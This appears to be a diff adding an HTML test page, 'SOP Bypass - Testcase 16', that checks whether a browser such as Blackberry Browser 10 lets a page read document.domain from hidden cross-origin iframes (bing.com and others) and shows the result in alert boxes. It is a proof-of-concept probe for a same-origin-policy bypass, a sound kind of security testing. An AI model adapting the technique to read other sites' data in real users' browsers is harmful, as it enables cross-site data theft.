@@ -1,0 +1,112 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 16</h3>	
+
+		<div class="main">
+				<p>Attempting to trigger a SOP Bypass using Nested iframes trick (Blackberry Browser 10) is prone to it</p>
+		</div>
+		
+		        <iframe width="0" height="0" src="http://www.w3schools.com" id="frame1" name="frame1">
+        </iframe>
+        <iframe width="0" height="0" src="https://www.bing.com" id="frame2" name="frame2">
+        </iframe>
+        <iframe width="0" height="0" src="https://www.example.com" id="frame3" name="frame3">
+        </iframe>
+       
+<script> 
+
+
+function sop1()
+{
+
+alert(this.frames[0].document.domain);
+	 
+	  
+	  }
+function sop2()
+{
+
+alert(this.frames[1].document.domain);
+	 
+	  
+	  }
+
+ 
+function sop3()
+{
+
+alert(this.frames[2].document.domain);
+	 
+	  
+	  }
+</script>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="sop1()" /></center><br>
+
+				<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="sop2()" /></center></br>
+				<center>	<input type="button" id="btn_test" class="test" value="Run Test Case" onclick="sop3()" /></center>
+
+
+
+ 
+ 
+
+		</br></br>
+		
+		<div class="note">
+		
+				<p><strong>Note:</strong> <br />
+					If page displays an alert box displaying bing.com, your browser is vulnerable to SOP bypass "
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
